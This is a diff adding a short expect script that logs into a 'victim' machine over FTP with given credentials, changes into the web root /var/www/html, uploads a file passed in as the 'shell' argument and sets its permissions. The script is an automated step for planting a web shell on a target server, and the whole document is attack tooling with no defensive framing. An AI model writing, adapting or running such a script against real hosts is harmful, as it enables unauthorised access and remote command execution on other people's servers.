@@ -1,0 +1,41 @@
+#!/usr/bin/expect
+
+set user [lindex $argv 0]
+set password [lindex $argv 1]
+set victim [lindex $argv 2]
+set shell [lindex $argv 3]
+
+set timeout -1
+
+spawn ftp $victim
+expect {
+    "Name ($victim:root):" {
+        send "$user\r"
+    }
+}
+expect {
+    "Password:" {
+        send "$password\r"
+    }
+}
+expect {
+    "ftp>" {
+        send "cd /var/www/html\r"
+    }
+}
+expect {
+    "ftp>" {
+        send "put $shell\r"
+    }
+}
+expect {
+    "ftp>" {
+        send "chmod 644 $shell\r"
+    }
+}
+expect {
+    "ftp>" {
+        send "bye\r"
+    }
+}
+expect eof
